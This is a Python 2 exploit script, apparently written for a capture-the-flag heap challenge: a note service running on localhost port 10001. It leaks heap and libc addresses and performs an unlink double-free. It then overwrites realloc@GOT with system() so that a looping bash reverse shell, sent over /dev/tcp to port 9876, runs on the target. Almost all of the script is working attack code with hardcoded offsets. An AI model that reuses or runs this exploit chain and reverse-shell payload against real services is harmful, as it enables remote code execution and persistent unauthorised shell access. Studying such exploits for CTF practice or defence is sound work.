from zio import *
import os,subprocess,time


def exploit(host):
    io = None
    try:
        io = zio(host, timeout=1000, print_read=False, print_write=False)
        if not io :
            raise Exception
    except:
        print 'can\'t  caonnect server!'
        exit(0)

    def listnode():
        io.read_until('Your choice: ')
        io.writeline('1')

    def newnode(size, note):
        assert size == len(note)
        io.read_until('Your choice: ')
        io.writeline('2')
        io.read_until('Length of new note: ')
        io.writeline(str(size))
        io.read_until('Enter your note: ')
        io.writeline(note)
    

    def edit_node(no, size, note):
        assert size == len(note)
        io.read_until('Your choice: ')
        io.writeline('3')
        io.read_until('Note number: ')
        io.writeline(str(no))
        io.read_until('Length of note: ')
        io.writeline(str(size))
        io.read_until('Enter your note: ')
        io.writeline(note)
        

    def delnode(no):
        io.read_until('Your choice: ')
        io.writeline('4')
        io.read_until('Note number: ')
        io.writeline(str(no))




    #leak heap base
    def leak_heap():
        #raw_input("new node:")
        size = 0x10
        newnode(size,'0'*size)              
        newnode(size,'1'*size)    
        newnode(size,'2'*size)              
        newnode(size,'3'*size) 
        delnode(0)
        delnode(2)
        newnode(0x08,'!'*0x08)
        listnode()
        io.read_until('0. '+'!'*(0x08))
        heap = l64(io.readline().strip().ljust(8, '\x00')) - 0x1940
        print '[+] heap  =>  {0}'.format(hex(heap))    
        delnode(0)
        delnode(1)
        delnode(3)
        return heap

    #leak libc base
    def leak_libc():
        newnode(0x80,'0'*0x80)
        newnode(0x80,'1'*0x80)
        newnode(0x80,'2'*0x80)
        newnode(0x80,'3'*0x80)
        delnode(2)
        delnode(1)
        newnode(0x80+8+8,'a'*(0x80+8+8))    # no 2
        listnode()
        io.read_until('1. '+'a'*(0x80+8+8))
        libc = l64(io.readline().strip().ljust(8, '\x00')) - 0x3be7b8
        print '[+] libc  =>  {0}'.format(hex(libc))
        delnode(1)
        delnode(0)
        delnode(3)
        return libc

    heap = leak_heap()
    libc = leak_libc()
    got_realloc = 0x602060
    print '[+] got_realloc  =>  {0}'.format(hex(got_realloc))
    got_printf = 0x602030
    print '[+] got_printf  =>  {0}'.format(hex(got_printf))
    system = libc + 0x46640
    print '[+] system  =>  {0}'.format(hex(system))
    one_shot_shell = libc + 0x4652C
    print '[+] one_shot_shell  =>  {0}'.format(hex(one_shot_shell))

    def double_free():
        #raw_input("new node:")
        newnode(0x80,'0'*0x80)
        newnode(0x80,'1'*0x80)
        newnode(0x80,'2'*0x80)


        #raw_input("delnode:")
        delnode(1) 
        delnode(0)

        #raw_input("new double-size chunk:")
        newnode(0x80*2,'a'*0x80*2)
        #fake chunk
        prev_size = 0
        size = 0x80 + 1 
        fd = heap+0x18  #0x1111111111111111
        print '[+] fake_fd  =>  {0}'.format(hex(fd))
        bk = heap+0x20  #0x2222222222222222
        print '[+] fake_bk  =>  {0}'.format(hex(bk))
        fake_chunk = l64(prev_size) + l64(size) + l64(fd) + l64(bk) + 'b' * (0x80-4*8)
        next_chunk = l64(size-1) + l64(0x80 + 2*8) + 'c' * (0x80 - 2*8)
        payload = fake_chunk + next_chunk
        #raw_input("fake_chunk:")
        edit_node(0, len(payload), payload)
        #double free to unlink
        #raw_input("double free:")
        delnode(1)
 

    #double free
    double_free()

    #write where what
    where = l64(got_printf)
    what = l64(one_shot_shell)

    where = l64(got_realloc)
    what = l64(system)
    #must be 0x100 size, if not it will call realloc
    print("[+] Overwrite note_table")
    cmd = '''while true; do echo 'stdbuf  -i0 -o0 -e0 /bin/bash -i > /dev/tcp/127.0.0.1/9876 0<&1  2>&1' | /bin/bash;sleep 10;done;''' + '\x00'
    cmdAddr = heap + 0x50    
    notecount = l64(0x01)
    note0 = l64(0x01) + l64(0x08) + where
    note1 = l64(0x01) + l64(0x08) + l64(cmdAddr)
    edit_node(0, 0x100,  notecount +  note0 + note1  + cmd + "@"*(0x100 - len(notecount) - len(note0) - len(note1) - len(cmd) ))    
    print("[+] Overwrite realloc@GOT")
    edit_node(0, 0x08, what)


    #will call realloc which had been hooed by system
    edit_node(1, 0x32, "p"*0x32)
    print("[+] spawn shell")

    io.interact()


if __name__ == '__main__':
  host  = ('127.0.0.1',10001)
  exploit(host)
    

